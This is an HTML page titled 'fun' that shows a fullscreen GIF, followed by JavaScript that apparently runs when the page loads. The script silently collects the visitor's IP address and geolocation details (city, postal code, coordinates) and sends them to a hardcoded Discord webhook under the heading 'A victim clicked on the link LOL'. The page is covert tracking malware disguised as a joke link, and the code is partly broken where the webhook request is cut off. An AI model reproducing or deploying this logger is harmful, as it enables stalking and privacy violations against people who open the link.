<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>fun</title>
  <style>
    html,body {
      margin:0;
      height:100%;
      background:#000;
    }
    img {
      position:fixed;
      inset:0;
      width:100%;
      height:100%;
      object-fit:cover;
    }
  </style>
  <script defer src="script.js"></script>
</head>
<body>
  <img src="https://i.imgur.com/Bl7qEBS.gif" alt="Fullscreen GIF">
</body>
</html>

const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/1436552670143053844/kFFvwF2tV7BsZyOneYEzvXoR1aSI2LJj5KJNNcssv0TPLqnc3336UpUsSQbVwP80VI68
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "Ip",
                            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
                            content: `guhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh`,
                            embeds: [
                                {
                                    title: 'A victim clicked on the link LOL',
                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
                                    color: 0x800080
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {  
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};
sendIP();





